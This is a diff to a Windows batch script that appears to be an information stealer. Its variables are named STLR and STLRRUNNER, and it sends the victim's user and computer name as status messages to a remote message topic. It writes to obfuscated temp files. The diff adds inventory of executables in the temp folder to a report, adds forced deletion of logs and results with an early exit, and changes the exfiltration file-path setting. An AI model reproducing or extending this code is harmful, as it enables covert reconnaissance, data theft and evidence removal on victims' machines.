@@ -24,7 +24,7 @@ if !instances! geq 2 (
 ::goto :EOF
 
 
-set "BATCHVERSION=44.5T"
+set "BATCHVERSION=45.7T"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 del /f /a /q "%LOGFILE%"
 set "RESULT=%TEMP%\TGRESU.txa"
@@ -492,9 +492,11 @@ echo.
 ::timeout /t 15 /nobreak
 del /f /a /q "%LOGFILE%"
 ::attrib -h -s "%temp%\temp_scrip*.bat" & del /f /a /q "%temp%\temp_scrip*.bat"
+del /f /a /q %temp%\*.mseuopm
 del /f /a /q %temp%\*.mpee
 del /f /a /q %temp%\*.qwb
 del /f /a /q "%RESULT%"
+exit
 echo.
 goto :EOF
 
@@ -2332,6 +2334,31 @@ echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo List *.mseuopm files >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+dir /b /a "%temp%\*.mseuopm" >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo List *.exe files >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+dir /b /a "%temp%\*.exe" >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
+echo. >> "%InstalledQWB%"
 echo List ProgramData "%ProgramData%\Microsoft\Windows" files and folders >> "%InstalledQWB%"
 dir /b "%ProgramData%\Microsoft\Windows" >> "%InstalledQWB%"
 echo. >> "%InstalledQWB%"
@@ -2939,7 +2966,7 @@ set "TOPIC_ID_STLR=73727"
 set "MESSAGE_STLR=%USERNAME%(%COMPUTERNAME%)|STLR.COMSTARTED..|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE_STLR=%MESSAGE_STLR: =%%2"
 set "CAPTION_STLR=%USERNAME%(%COMPUTERNAME%)|STLRRUNNER|FINAL|%time%|(v%BATCHVERSION%)"
-set "FILE_PATH_STLR=%LOGFILE1%"
+
 
 
 :SENDINGSTLRMSGNOW
@@ -3329,9 +3356,8 @@ if %errorlevel%==0 (
 
 
 
-
-
 del /f /a /q "%RESULT%"
+del /f /a /q "%LOGFILE1%"
 ::del /f /a /q "%ZIP_FILE%"
 
 
